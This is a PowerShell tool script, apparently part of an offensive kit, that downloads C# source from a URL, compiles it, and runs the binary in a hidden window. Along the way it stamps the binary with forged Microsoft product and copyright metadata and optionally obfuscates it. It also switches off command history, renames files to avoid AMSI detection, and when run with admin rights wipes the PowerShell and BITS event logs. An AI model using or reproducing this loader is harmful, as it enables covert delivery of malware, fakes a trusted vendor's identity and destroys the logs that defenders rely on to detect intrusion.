<#
.SYNOPSIS
   Download\Compile\Execute CS scripts On-The-Fly!

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: Microsoft.NET {native}
   Optional Dependencies: BitsTransfer {native}
   PS cmdlet Dev version: v1.3.7

.DESCRIPTION
   This CmdLet downloads\compiles script.cs (To exe) and executes the binary.

.NOTES
   This cmdlet allow users to download CS scripts from network [ -Uri http://script.cs ]
   Or simple to compile an Local CS script into a standalone executable and execute him!
   Remark: Compiling CS scripts using this module will NOT bypass in any way AV detection.
   Remark: URL's must be in RAW format [ https://raw.githubusercontent.com/../script.cs ]

.Parameter Action
   Accepts arguments: Compile, Execute (default: Execute)

.Parameter Uri
   URL of Script.cs to be downloaded OR Local script.cs absoluct \ relative path

.Parameter OutFile
   Standalone executable name to be created plus is absoluct \ relative path

.Parameter IconSet
   Accepts arguments: True or False (default: False)

.Parameter FileDescription
   The Compiled standalone executable file description

.Parameter Obfuscate
   Obfuscate the Compiled Executable (default: False)

.EXAMPLE
   PS C:\> Get-Help .\CsOnTheFly.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Execute
   Create demo script.cs \ compile it to binary.exe and execute him!

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Execute -IconSet True
   Create demonstration script.cs \ compile it to binary.exe and add
   redpill icon.ico to compiled standalone executable and execute him!

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Compile -Uri "calc.cs" -OutFile "out.exe"
   Compiles Local -Uri [ calc.cs ] into an standalone executable (dont-execute-exe)

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "calc.cs" -OutFile "out.exe"
   Compiles Local -Uri [ calc.cs ] into an standalone executable and execute it.

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "calc.cs" -OutFile "out.exe" -Obfuscate True
   Compiles Local -Uri [ calc.cs ] into an standalone executable, obfuscate and execute binary.

.EXAMPLE
   PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "https://raw.github.com/../calc.cs" -OutFile "$Env:TMP\out.exe"
   Downloads -Uri [ URL ] compiles the cs script into an standalone executable and executes the resulting binary.
   Remark: Downloading script.CS from network (https://raw.) will mandatory download them to %tmp% directory!

.INPUTS
   None. You cannot pipe objects into CsOnTheFly.ps1

.OUTPUTS
   Compiling SpawnPowershell.cs On-The-Fly!
   ----------------------------------------
   Microsoft.NET   : 4.8.03752
   NETCompiler     : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
   Uri             : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/SpawnPowershell.cs
   OutFile         : C:\Users\pedro\AppData\Local\Temp\Installer.exe
   FileDescription : @redpill CS Compiled Executable
   Action          : Execute
   ApplIcon?       : False
   Compiled?       : True

   Directory                         Name          Length CreationTime       
   ---------                         ----          ------ ------------       
   C:\Users\pedro\AppData\Local\Temp Installer.exe   4096 06/04/2021 15:55:40
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$FileDescription="@redpill CS Compiled Executable",
   [string]$Uri="$Env:TMP\SpawnPowershell.cs",
   [string]$OutFile="$Env:TMP\Installer.exe",
   [string]$Obfuscate="False",
   [string]$Action="Execute",
   [string]$IconSet="False"
)


$ORIGINALURL = $null
$cmdletversion = "1.3.7"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$Working_Directory = pwd|Select-Object -ExpandProperty Path


## * [ Compiled StandAlone Executable Icon ] *
# Attacker needs to copy is own icon.ico to -OutFile [ dir ]
# and rename it as 'myicon.ico' if you wish to use your own
# icon on the compiled standalone executable binary.exe or
# else this cmdlet downloads redpill.ico to add to binary.exe
$RaOuPath = $OutFile.Split('\\')[-1]                       ## Installer.exe
$StrInput = $OutFile -replace "$RaOuPath",""               ## C:\Users\pedro\AppData\Local\Temp\
$IconFile = "$StrInput" + "myicon.ico" -Join ''            ## C:\Users\pedro\AppData\Local\Temp\myicon.ico


## Creates demonstration CS script in the case
# of -URI [ script.cs ] user input its NOT found!
$PSInstallPath = $PsHome ## Store PowerShell path!
$RawCSScript = @("
/*
   Author: @r00t-3xp10it
   redpill v1.2.6 - CsOnTheFly Internal Module!
*/

using System.Diagnostics;
namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
            var spawnmyprompt = new ProcessStartInfo();
            spawnmyprompt.UseShellExecute = true;
            spawnmyprompt.FileName = @`"powershell.exe`";
            spawnmyprompt.WorkingDirectory = @`"$PSInstallPath`";
            Process.Start(spawnmyprompt);
        }
    }
}")


If($Action -ieq "Compile" -or $Action -ieq "Execute"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - download\compile\execute CS scripts On-The-Fly!

   .EXAMPLE
      PS C:\> .\CsOnTheFly.ps1 -Action Compile -Uri "calc.cs" -OutFile "out.exe"

   .EXAMPLE
      PS C:\> .\CsOnTheFly.ps1 -Action Compile -Uri "calc.cs" -OutFile "out.exe" -IconSet True

   .EXAMPLE
      PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "calc.cs" -OutFile "out.exe" -FileDescription "myapplication"

   .EXAMPLE
      PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "$Env:TMP\calc.cs" -OutFile "$Env:TMP\out.exe" -Obfuscate True

   .EXAMPLE
      PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "https://raw.github.com/../calc.cs" -OutFile "$Env:TMP\out.exe"
   #>


   If($Uri -iMatch '^[http(s)]+://'){## Download script.CS from network URL sellected!

      If(-not($Uri -iMatch '(.cs)$')){## Make sure we are downloading a CS script!
         Write-Host "[error] Bad Uri input: This module only compiles .CS scripts!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "[error] Uri: $Uri`n`n" -ForegroundColor Yellow
         exit ## Exit @CsOnTheFly
      }

     If(-not($Uri -iMatch '/raw/' -or $Uri -iMatch 'raw.')){## Make sure we are downloading from RAW URL format!
        Write-Host "[error] Bad Uri input: This module only accepts 'raw' URL formats!" -ForegroundColor Red -BackgroundColor Black
        Write-Host "[:url:] https://raw.githubusercontent.com/../script.cs" -ForegroundColor Yellow
        Write-Host "[:url:] https://pastebin.com/raw/../script.cs`n" -ForegroundColor Yellow
        exit ## Exit @CsOnTheFly
      }

      ## Use BitsTransfer to download our script.CS to %tmp% location!
      # iwr -Uri "$Uri" -OutFile "${Env:TMP}\${StripName}" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
      $StripName = $Uri.Split('/')[-1] ## https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/SpawnPowershell.cs => $Env:TMP\SpawnPowershell.cs
      Start-BitsTransfer -priority foreground -Source "$Uri" -Destination "${Env:TMP}\${StripName}" -ErrorAction SilentlyContinue|Out-Null
      $ORIGINALURL = "$Uri";$Uri = "${Env:TMP}\${StripName}" ## Define $Uri variable again!

   }


   ## Local Compilation sellected by attacker!
   If(-not($Uri -iMatch '(.cs)$')){## Make sure we are compiling a CS script!
      Write-Host "[error] Bad Uri input: This module only compiles .CS scripts!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "[error] Uri: $Uri`n`n" -ForegroundColor Yellow
      exit ## Exit @CsOnTheFly
   }

   ## Script.CS not found => Create demonstration script!
   If(-not(Test-Path -Path "$Uri" -EA SilentlyContinue)){
      write-host "[error] Uri: '$Uri' Not found, creating demo script!" -ForegroundColor Red -BackgroundColor Black
      echo "$RawCSScript"|Out-File $Uri -encoding ascii -force
   }

   If(Test-Path -Path "$OutFile"){## Make sure -OutFile does NOT exist!
      $RawFileName = $OutFile.Split('\\')[-1] ## Strp filename from path!
      $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 | Get-Random -Count 8 | %{[char]$_}) ## Random FileName Generation
      Write-Host "[error] OutFile: '$RawFileName' allready exists!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "[info:] Renaming OutFile Name to: $Rand.exe" -ForegroundColor Yellow
      $RawFilePath = $OutFile -replace "$RawFileName",""
      $OutFile = "$RawFilePath" + "$Rand.exe" -join ''
   }

   If($OutFile -iMatch '(Payload.exe)$'){## [error] OutFile Name => amsi detection!
      $RawFileName = $OutFile.Split('\\')[-1] ## Strp filename from path!
      $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 | Get-Random -Count 8 | %{[char]$_}) ## Random FileName Generation
      Write-Host "[error] OutFile: '$RawFileName' will trigger Amsi detection!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "[info:] Renaming OutFile Name to: $Rand.exe" -ForegroundColor Yellow
      $RawFilePath = $OutFile -replace "$RawFileName",""
      $OutFile = "$RawFilePath" + "$Rand.exe" -join ''
   }


   ## Get Last Microsoft.NET version installed absoluct path
   $LocalCSPath = Get-ChildItem -Path "$Env:WINDIR\Microsoft.NET" -Recurse -EA SilentlyContinue -Force | Where-Object {
      $_.PSIsContainer -ieq $False -and $_.FullName -iMatch '(csc.exe)$' -and $_.FullName -NotMatch '(.config)$'
   }|Select-Object -Last 1 -ExpandProperty FullName 

   ## Compile CS script to standalone executable
   # C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /target:winexe /win32icon:icon.ico /out:$OutFile $Uri|Out-Null
   $RegQueryKey = "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"
   $GetNetVersion = (Get-ItemProperty "$RegQueryKey" -EA SilentlyContinue).Version
   If(Test-Path -Path "$LocalCSPath" -EA SilentlyContinue){

      If($IconSet -ieq "True"){## Compile binary.exe with @redpill icon!
         
         If(-not(Test-Path -Path "$IconFile" -EA SilentlyContinue)){## Download icon from @redpill repo => IF does NOT exist!

            ## iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/redpillIcon1.ico -OutFile $IconFile -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0" -ErrorAction SilentlyContinue -WarningAction SilentlyContinue|Out-Null         
            Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/redpillIcon1.ico -Destination "$IconFile" -ErrorAction SilentlyContinue|Out-Null

         }

         $CmdLine = "/nologo /target:winexe /win32icon:$IconFile /out:$OutFile $Uri" ## add redpill icon to binary.exe

      }Else{## Compile binary.exe with windows default icon!
      
         $CmdLine = "/nologo /target:winexe /out:$OutFile $Uri" ## binary.exe default windows icon!
      
      }

      $ProcName = "$LocalCSPath"
      ## Use powershell interpreter
      # to execute Microsoft.NET compiler!
      powershell -C $ProcName $CmdLine|Out-Null

   }Else{## [error] Microsoft.NET framework not found!
   
      Write-Host "[error] Not found Microsoft.NET Compiler! (csc.exe)`n`n" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @Compilecs
   
   }


   ## Check if binary {compiled} exists!
   If((Get-ChildItem -Path "$OutFile" -EA SilentlyContinue).Exists -ieq "True"){

      $CompileState = "True"

   }Else{## Fail to compile CS to binary

      $RawErrorName = $OutFile.Split('\\')[-1]
      $CompileState = "Fail to create '$RawErrorName'!"

   }


   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Change Standalone executable description!

   .NOTES
      Required dependencies: BitsTransfer
      Required dependencies: verpatch.exe

   .OUTPUTS
      FileVersion : 1.2.6
      FileName    : Intaller.exe
      Description : @redpill CS Compiled Executable
      ProductName : Microsoft® Windows® Operative System
      Copyright   : ©Microsoft Corporation. All Rights Reserved
   #>


   ## Download verpatch.exe from PandoraBox repository!
   If(-not(Test-Path -Path "verpatch.exe" -ErrorAction SilentlyContinue)){
      Start-BitsTransfer -priority foreground -Source "https://raw.githubusercontent.com/r00t-3xp10it/PandoraBox/master/PandoraBox/FileDescription/verpatch.exe" -Destination "verpatch.exe" -ErrorAction SilentlyContinue|Out-Null
   }

   $ProDuctName = $OutFile.Split('\\')[-1]
   ## Change Compiled Standalone executable file description!
   Write-Host "[info:] Modify '$ProDuctName' file description!" -ForegroundColor Yellow
   If(Test-Path -Path "verpatch.exe" -ErrorAction SilentlyContinue){

      .\verpatch.exe /va "$OutFile" "$cmdletversion" /s desc "$FileDescription" /s pb "$cmdletversion" /s product "Microsoft Windows Operative System" /pv "$cmdletversion" /s copyright "Microsoft Corporation. All Rights Reserved" /s OriginalFilename "$ProDuctName"

   }Else{## [error] fail to download verpatch.exe!
   
      Write-Host "[error] fail to download verpatch.exe!" -ForegroundColor Red -BackgroundColor Black

   }

   
   If($Obfuscate -ieq "True"){

      <#
      .SYNOPSIS
         Author: @mkaring|@r00t-3xp10it 
         Helper - Obfuscate .NET applications!

      .NOTES
         Required dependencies: Confuser.CLI.exe {auto-download}
         Remark: ConfuserEx sometimes fail to obfuscate C# sourcecode
         but this function will NOT brake the compiled executable if it fail!
         Remark: Activate $debugging = "True" to debug ConfuserEx while working!

      .EXAMPLE
         PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "$Env:TMP\script.cs" -OutFile "$Env:TMP\Installer.exe" -Obfuscate True
      #>


      $Debugging = "False" ## Manual!
      If(-not($OutFile -Match '\\')){

         $BinaryName = $OutFile
         $ZipDirectory = $Working_Directory

      }Else{## Payload absoluct path sellected!

         $BinaryName = $OutFile.Split('\\')[-1]
         $ZipDirectory = $OutFile -replace "\\$BinaryName",""

      }

      ## Download ConfuserEx from my github repository!
      If(-not(Test-Path -Path "$ZipDirectory\ConfuserEx.zip" -ErrorAction SilentlyContinue)){
         Start-BitsTransfer -priority foreground -Source "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/ConfuserEx.zip" -Destination "$ZipDirectory\ConfuserEx.zip" -ErrorAction SilentlyContinue|Out-Null
      }

      If(Test-Path -Path "$ZipDirectory\ConfuserEx.zip" -EA SilentlyContinue){

         cd $ZipDirectory;tar.exe -x -f ConfuserEx.zip

         If($Debugging -ieq "True"){## [debug] Obfuscating .NET applications!

            Write-Host "[info:] Obfuscating '$BinaryName' .NET application!" -ForegroundColor Yellow
            Write-Host "----------------------------------------------------"
            Start-Sleep -Seconds 1;cmd /R Confuser.CLI.exe "$BinaryName" -out "Obfuscated.exe"
            Write-Host "----------------------------------------------------"

         }Else{## [default] Obfuscating .NET applications!

            Start-Process -WindowStyle Hidden -filepath "Confuser.CLI.exe" -ArgumentList "-noPause `"$BinaryName`" -out `"Obfuscated.exe`""

         }

         ## Make sure ConfuserEx has obfuscated the compiled application!
         If(-not(Test-Path -Path "$ZipDirectory\Obfuscated.exe" -ErrorAction SilentlyContinue)){

            Write-Host "[error] ConfuserEx: fail to obfuscate '${BinaryName}' appl!" -ForegroundColor Red -BackgroundColor Black
            ## Remark: Next cmdline stops Confuser.CLI.exe background process if it have fail on is task (hang)!
            Stop-Process -Name "Confuser.CLI" -ErrorAction SilentlyContinue -Force|Out-Null

         }Else{## Binary successfully obfuscated!

            Move-Item -Path "Obfuscated.exe" -Destination "$BinaryName" -EA SilentlyContinue -Force

         }

      }

      cd $Working_Directory
      ## Delete all artifacts left behind!
      Remove-Item -Path "$ZipDirectory\*.dll" -ErrorAction SilentlyContinue -Force
      Remove-Item -Path "$ZipDirectory\*.config" -ErrorAction SilentlyContinue -Force
      Remove-Item -Path "$ZipDirectory\Confuser.CLI.exe" -ErrorAction SilentlyContinue -Force
      Remove-Item -Path "$ZipDirectory\ConfuserEx.zip" -ErrorAction SilentlyContinue -Force

   }


   If($ORIGINALURL -ne $null){

      $Uri = $ORIGINALURL ## HTTP(S) - https://raw.githubusercontent.com/../calc.cs
      $DispName = $Uri.Split('/')[-1] ## calc.cs

   }ElseIf($Uri -Match '\\'){

      $DispName = $Uri.Split('\\')[-1] ## LOCAL - calc.cs

   }ElseIf($Uri -NotMatch '/' -or $Uri -NotMatch '\\'){

      $DispName = $Uri ## RELATIVE PATH - calc.cs
   }

   Write-Host "`n`nCompiling $DispName On-The-Fly!" -ForegroundColor Green
   Write-Host "----------------------------------------"

   ## Create Data Table for Output
   $mytable = New-Object System.Data.DataTable
   $mytable.Columns.Add("Microsoft.NET")|Out-Null
   $mytable.Columns.Add("NETCompiler")|Out-Null
   $mytable.Columns.Add("Uri")|Out-Null
   $mytable.Columns.Add("OutFile")|Out-Null
   $mytable.Columns.Add("FileDescription")|Out-Null
   $mytable.Columns.Add("Action")|Out-Null
   $mytable.Columns.Add("ApplIcon?")|Out-Null
   $mytable.Columns.Add("Compiled?")|Out-Null
   $mytable.Rows.Add("$GetNetVersion",
                     "$LocalCSPath",
                     "$Uri",          ## <- Accepts: ( http:// | C:\windows | calc.cs ) Path's
                     "$OutFile",
                     "$FileDescription",
                     "$Action",
                     "$IconSet",
                     "$CompileState")|Out-Null

   ## Display Output Table
   $mytable|Format-List > $Env:TMP\OutputTable.log
   Get-Content -Path "$Env:TMP\OutputTable.log" | Select-Object -Skip 2 | Select-Object -SkipLast 3


   ## Display standalone executable state { Get-ChildItem }
   If(Test-Path -Path "$OutFile" -ErrorAction SilentlyContinue){
      Get-ChildItem -Path "$OutFile" -ErrorAction SilentlyContinue |
         Select-Object Directory,Name,Length,CreationTime | Format-Table -AutoSize
   }

   If($Action -ieq "Execute"){
   
      ## Execute the compiled binary!
      Start-Process -WindowStyle Hidden -FilePath "$OutFile" -EA SilentlyContinue|Out-Null
   
   }


}Else{## [error] Missing cmdlet arguments!

   Write-Host "[error:] Missing cmdlet arguments!" -ForegroundColor Red -BackgroundColor Black
   Write-Host "[syntax] .\CsOnTheFly.ps1 -Action Execute -Uri `"calc.cs`" -OutFile `"out.exe`"`n`n" -ForegroundColor Yellow

}


<#
.SYNOPSIS
   Helper - Delete ALL artifacts left behind!

.NOTES
   This function will delete Bits-Transfer logfiles from eventvwr
   SnapIn if CsOnTheFly its executed with Administrator privileges!
   By default it only deletes @CsOnTheFly cmdlet artifacts left behind! 
#>

If(Test-Path -Path "$Env:TMP\OutputTable.log" -EA SilentlyContinue){
   Remove-Item -Path "$Env:TMP\OutputTable.log" -Force
}
If(Test-Path -Path "verpatch.exe" -EA SilentlyContinue){
   Remove-Item -Path "verpatch.exe" -Force
}
If(Test-Path -Path "$IconFile" -EA SilentlyContinue){
   Remove-Item -Path "$IconFile" -Force
}

## Administrator Privileges cleanning!
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
If($IsClientAdmin){## Clean related eventvwr logfiles

   $CleanPSo = (wevtutil gli "Microsoft-Windows-Powershell/Operational" | Where-Object { 
      $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''

   If($CleanPSo -gt 0){## Delete ALL Powershell LogFiles
      Write-Host "[+] Eventvwr Powershell/Operational Logs Deleted!" -ForeGroundColor Yellow
      wevtutil cl "Microsoft-Windows-Powershell/Operational" | Out-Null
   }

   $CleanWPS = (wevtutil gli "Windows Powershell" | Where-Object { 
      $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''

   If($CleanWPS -gt 0){## Delete ALL Powershell LogFiles
      Write-Host "[+] Eventvwr Windows Powershell Logs Deleted!" -ForeGroundColor Yellow
      wevtutil cl "Windows Powershell" | Out-Null
   }

   $CleanBT = (wevtutil gli "Microsoft-Windows-Bits-Client/Operational" | Where-Object { 
      $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''

   If($CleanBT -gt 0){## Delete ALL Bits-Transfer LogFiles
      Write-Host "[+] Eventvwr Bits-Client/Operational Logs Deleted!" -ForeGroundColor Yellow
      wevtutil cl "Microsoft-Windows-Bits-Client/Operational" | Out-Null
   }

}
Write-Host ""